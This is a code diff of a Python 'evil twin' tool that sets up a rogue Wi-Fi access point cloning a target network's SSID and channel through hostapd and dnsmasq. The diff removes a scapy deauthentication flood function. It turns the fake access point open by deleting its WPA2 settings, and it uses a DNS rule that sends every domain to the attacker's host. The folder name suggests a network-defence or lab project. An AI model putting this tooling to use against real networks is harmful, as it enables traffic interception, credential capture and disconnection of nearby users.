@@ -2,8 +2,6 @@
 
 import subprocess
 from argparse import ArgumentParser
-from scapy.all import sendp
-import scapy.layers.dot11 as dot11
 
 DIR_PATH = '/home/lioz/Desktop/Lioz/Defends Network/eviltwin'
 
@@ -25,6 +23,13 @@ def set_configs():
                 metavar='<upstream interface>',
                 help='Use this interface as access point.')
 
+    parser.add_argument('-i',
+            dest='phys',
+            required=True,
+            type=str,
+            metavar='<phys interface>',
+            help='Use this interface as connectivity one.')
+
     parser.add_argument('-s',
                 dest='ssid',
                 required=True,
@@ -45,12 +50,14 @@ def set_configs():
         'upstream' : args.upstream,
         'ssid' : args.ssid,
         'channel' : args.channel,
+        'phys' : args.phys
     }
 
 def display_configs(configs):
 
     print
     print ('[+] Access Point interface:', configs['upstream'])
+    print ('[+] Physical interface:', configs['phys'])
     print ('[+] Target AP Name:', configs['ssid'])
     print ('[+] Target AP Channel:', configs['channel'])
     print
@@ -66,17 +73,6 @@ def kill_daemons():
 
     print
     print ('[*] Continuing...')
-
-def deauth(src , dst , interface , count=100):
-
-    pkt1 = dot11.RadioTap()/dot11.Dot11(addr1=src, addr2=dst, addr3=dst)/dot11.Dot11Deauth()
-    pkt2 = dot11.RadioTap()/dot11.Dot11(addr1=dst, addr2=src, addr3=src)/dot11.Dot11Deauth()
-
-    i = count
-    while i > 0:
-        sendp(pkt1, iface=interface)
-        sendp(pkt2, iface=interface)
-        i -= 1
 
 def bash_command(command):
 
@@ -108,6 +104,7 @@ class HostAPD(object):
             upstream,
             ssid,
             channel,
+            password='12345678',
             driver=HOSTAPD_DEFAULT_DRIVER,
             hw_mode=HOSTAPD_DEFAULT_HW_MODE):
 
@@ -118,16 +115,7 @@ class HostAPD(object):
                 'driver=%s' % driver,
                 'ssid=%s' % ssid,
                 'channel=%d' % channel,
-                'hw_mode=%s' % hw_mode,
-                'macaddr_acl=0',
-                'ignore_broadcast_ssid=0',
-                'auth_algs=1',
-                'wpa=2',
-                'wpa_passphrase=12345678',
-                'wpa_key_mgmt=WPA-PSK',
-                'wpa_pairwise=CCMP',
-                'ieee80211n=1',
-                'wme_enabled=1'
+                'hw_mode=%s' % hw_mode
             ]))
 
 
@@ -164,11 +152,9 @@ class DNSMasq(object):
                 'interface=%s' % upstream,
                 'dhcp-range=%s' % dhcp_range,
                 '\n'.join('dhcp-option=%s' % o for o in dhcp_options),
-                'server=10.0.0.1',
-                'address=/#/10.0.0.32',
+                'address=/#/10.0.0.1',
                 'log-queries',
-                'log-dhcp',
-                'listen-address=127.0.0.1'
+                'log-dhcp'
             ]))
 
 
